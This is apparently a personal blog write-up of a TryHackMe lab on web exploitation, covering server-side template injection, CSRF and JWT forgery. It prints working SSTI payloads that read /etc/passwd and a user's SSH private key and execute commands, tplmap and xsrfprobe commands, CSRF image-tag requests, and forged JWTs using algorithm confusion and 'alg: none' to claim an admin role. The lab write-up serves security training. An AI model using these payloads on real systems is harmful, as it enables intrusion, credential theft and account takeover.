---
layout: single
title: ZTH - TryHackMe
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/security.jpg
categories:
  - Blue Team
  - infosec
tags:
  - Blue Team
  - Red Team
---


# What is SSTI

A template engine allows developers to use static HTML pages with dynamic elements. Take for instance a static profile.html page, a template engine would allow a developer to set a username parameter, that would always be set  to the current user's username

Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.

For example take the code    

![image](https://user-images.githubusercontent.com/89842187/133337009-7efd6e80-96ae-4dc7-85c7-c6845c7e7af7.png)

This introduces a vulnerability, as it allows a hacker to inject template code into the website. The effects of this can be devastating, from XSS, all the way to RCE.

Note: Different template engines have different injection payloads, however usually you can test for SSTI using {{2+2}} as a test.

## Manual Exploitation of SSTI

Turning the code earlier into a full flask application, gives us this page. It takes a prompt for a name, and then returns Hello <name>!.
  
![image](https://user-images.githubusercontent.com/89842187/133337086-e509c772-2279-4a82-a98e-d7edcb8807f3.png)
  
Fortunately, we don't have to do much recon as we already know this is vulnerable to SSTI, lets try injecting some basic template code

![image](https://user-images.githubusercontent.com/89842187/133337115-0eee7d03-d109-4b1d-b769-a21fc3c4b013.png)
  
 Boom! That's template injection. We can use the wonderful repository PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection to find some payloads for flask's template engine. The repo says we can use the code 

{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}} to read files on the server. Effectively all that payload does is load the file object in python, from there we can use basic file operations. Let's try to read /etc/passwd using this method 
  
  ![image](https://user-images.githubusercontent.com/89842187/133337288-f531edc9-e5e8-4eaf-8abd-18adeec31332.png)
  
  We have LFI! Unfortunately(or fortunately depending on how you view it), that is not the extent of this vulnerability. The same repo, also includes a payload for remote code execution. 

We can use the code {{config.__class__.__init__.__globals__['os'].popen(<command>).read()}} to execute commands on the server. All that payload does is import the os module, and run a command using the popen method.
  
  ![image](https://user-images.githubusercontent.com/89842187/133337304-0469c16a-be18-4547-a8c8-1d0eb59b59f1.png)
  From there, an attacker has already won, they can use this ability to gain a shell on the server.

How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)


```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}  
```
What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)

```
 {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa).read()}} 
```



# Automatic Exploitation of SSTI
  
  Fortunately, we don't have to go searching for payloads to see how we can use SSTI to our advantage, because there is a tool known as Tplmap that does that for us! The tool can be found here. 
  
  https://github.com/epinna/tplmap

  
- Note: use python2 to install the requirements. python2 -m pip
  
  GET	tplmap -u <url>/?<vulnparam>
POST	tplmap -u <url> -d '<vulnparam>'
Since our code operates via a form, the post syntax will be used.
  
  ![image](https://user-images.githubusercontent.com/89842187/133421449-b4941acb-8fb1-4f0c-84e4-04629f4beb9d.png)
  
  From there we can effectively do everything we did in the manual exploitation task, from a command line. Let's try running id using tplmap.

  
![image](https://user-images.githubusercontent.com/89842187/133421459-33b1aa2e-f64d-4806-b35c-f14700a82b97.png)
  
  How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".

```
/tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat /etc/passwd"
```

The basic syntax for tplmap is different depending on whether you're using get or post
  
  # What is CSRF
  
  Cross Site Request Forgery, known as CSRF occurs when a user visits a page on a site, that performs an action on a different site. For instance, let's say a user clicks a link to a website created by a hacker, on the website would be an html tag such as <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">  which would change the account email on the vulnerable website to "pwned@evil-user.net".  CSRF works because it's the victim making the request not the site, so all the site sees is a normal user making a normal request.

This opens the door, to the user's account being fully compromised through the use of a password reset for example. The severity of this cannot be overstated, as it allows an attacker to potentially gain personal information about a user, such as credit card details in an extreme case.
 
  
## Manual exploitation of CSRF
  
  Let's take an example application 
![image](https://user-images.githubusercontent.com/89842187/133428831-f559a24d-5d82-443b-bf73-964288aaff6b.png)

  It seems simple enough, As user bob, I can send funds to either Bob or Alice with any of the available balance in my account. Let's take a closer look at the request in burp.

![image](https://user-images.githubusercontent.com/89842187/133428852-26ca5f6a-e71c-4675-9d30-f1a45ee52829.png)
  
  This is looking good, parameters we can customize and a session cookie that is automatically set. Everything seems vulnerable to CSRF. Let's try and make a vulnerable site. Putting <img src="http://localhost:3000/transfer?to=alice&amount=100"> into an html file and using SimpleHTTPServer to host it should change's Alice's balance by 100, Let's see if it does!
![image](https://user-images.githubusercontent.com/89842187/133431852-fb7cb8de-7384-475d-a32a-df3a611b6b56.png)
  
## AutomaticScanner 
Once again, there is a nice automated scanner, which tests if a site is vulnerable to CSRF. this tool is known as xsrfprobe and can be install via pip using pip3 install xsrfprobe. This will only work using python 3(I mean come on it's 2020 you should be using python 3 anyway).

The syntax for the command is xsrfprobe -u <url>/<endpoint>. Let's run this against our vulnerable site.
  
  ![image](https://user-images.githubusercontent.com/89842187/133431977-0791abac-c925-4e2a-9413-382e3dc9dadb.png)

  The output confirms that we've managed to manually exploiting it and that the site is vulnerable to csrf. 
  
  # JWT Intro
  
  Json Web Token's are a fairly interesting case, as it isn't a vulnerability itself. Infact, it's a fairly popular, and if done right very secure method of authentication. The basic structure of a JWT is this, it goes "header.payload.secret", the secret is only known to the server, and is used to make sure that data wasn't changed along the way. Everything is then base64 encoded. so an example JWT token would look like 
```
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```
Meaning that if we are able to control the secret, we can effectively control the data. To be able to do this we have to understand how the secret is calculated. This requires knowing the structure of the header, a typical JWT header looks like this {"typ":"JWT","alg":"RS256"}. We're interested in the alg field. RS256 uses a private RSA key that's only available to the server, so that's not vulnerable. However, We can change that field to HS256, This is calculated using the server's public key, which in certain circumstances we may have access too.

## JWT Manual Exploitation
  
  We start off with a basic application

![image](https://user-images.githubusercontent.com/89842187/133433474-ae12ffa5-eec9-44f2-a2d9-1de5b08cb444.png)
  
  With a JWT, and a JWT verifier. Sending it garbage results in a failure, so let's try decoding the JWT.

![image](https://user-images.githubusercontent.com/89842187/133433492-456106fa-3f64-47fc-9b29-f5cd6c3a384b.png)
  
  Decoding the JWT gives us our header, payload, and a bunch of garbage which is the secret.

![image](https://user-images.githubusercontent.com/89842187/133433509-c9ac9c07-8845-4415-8c2b-1f51ab2e802b.png)


Unfortunately it seems the algorithm is RS256, which doesn't have any vulnerabilities. Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret! The first step is to change the algorithm in the header to HS256, and then re encode it in base64. Our new JWT is 
  
  ```
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA
  ```
  
  The next step is to convert the public key to hex so openssl will use it.

![image](https://user-images.githubusercontent.com/89842187/133436435-23e5b5ec-c87c-4c1e-bdc1-0b42d227a692.png)
  
  (Explanation: a is the file with the public key, xxd -p turns the contents of a file to hex, and tr is there to get rid of any newlines)

The next step is to use openssl to sign that as a valid HS256 key.
  
  ![image](https://user-images.githubusercontent.com/89842187/133436451-e34bd0c0-f4a1-44ae-8394-b7bf39b9a173.png)
  
  Everything is going just fine so far!. The final step is to decode that hex to binary data, and reencode it in base64, luckily python makes this really easy for us.

![image](https://user-images.githubusercontent.com/89842187/133436465-11ee3077-8ddc-4842-bb6a-df5f34a61b9c.png)
  
  That's our final secret, now we just put that where the secret should go, and the server should accept it.

So our final JWT would beeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>

![image](https://user-images.githubusercontent.com/89842187/133436489-87009ba8-138d-400c-96f7-e94f27892e8c.png)
  
  
 In addition to the previous vulnerability, certain JWT libraries have another devastating vulnerability. There is actually three possible algorithms, two of them RS256 and HS256 which we have already studied. There is a third algorithm, known as None. According to the official JWT RFC https://tools.ietf.org/html/rfc7519 the None algorithm is used when you still want to use JWT , however there is other security in place to stop people from spoofing data. 

Unfortunately certain JWT libraries clearly didn't read the RFC, allowing a vulnerability where an attacker can switch to the None algorithm, in the same way one switches to RS256 to HS255, and have the token be completely valid without even needing to calculate a secret.
  
  # Manually exploitating the JWT None vuln
  
  We start off with a simple login application.

![image](https://user-images.githubusercontent.com/89842187/133498352-1c68837e-ebb5-46e9-b448-d270a5c47603.png)
  
  Logging in gives us a user screen, as well as a JWT token.

![image](https://user-images.githubusercontent.com/89842187/133498365-63f29f18-1f98-4c6d-87a2-d40d8a04326d.png)
  
  Let's examine that token in the wonderful site jwt.io

(Very nice site btw, definitely recommend for all your jwt needs)

Now let's try changing the alg field to none, get rid of the signature, and change the role to admin. That leaves us with this final jwt token. 
```  eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg1MzQ1ODg0MjA0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg1MzQ1ODg0fQ.
```

The interesting thing is, we still need a second . to denote that a signature would be there, even though we don't put anything after it. Let's try popping that token in where the cookie is supposed to be.

  ![image](https://user-images.githubusercontent.com/89842187/133498560-e567fbf6-f61e-4850-8de1-a4d79addc6a6.png)
  
  There is no tool that can check the library, get the token, and make sure this is vulnerable. Therefore, you're gonna have to do this manually. The header for each JWT none vuln though is the same, which can help you out. Here's the header

  ```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
Which decodes to {"type": "JWT", "alg": "none"}
  
  ```


